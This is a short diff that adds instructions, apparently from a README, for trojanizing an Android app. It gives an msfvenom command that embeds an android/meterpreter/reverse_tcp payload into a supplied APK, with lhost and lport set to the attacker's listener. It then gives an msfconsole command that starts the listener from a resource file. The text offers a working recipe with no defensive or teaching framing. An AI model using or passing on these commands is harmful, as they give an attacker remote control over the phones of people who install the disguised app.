@@ -1,0 +1,8 @@
+Extract the zip file and use this command in same direcotory. 
+Make sure you should chane lport and lhost
+
+
+msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost=ip-address lport=port -o payload-name.apk
+
+Start Listner 
+msfconsole -q -r '/home/kalio/Downloads/android-meterpreter-stageless-reverse-tcp-4444-apk.rc' 
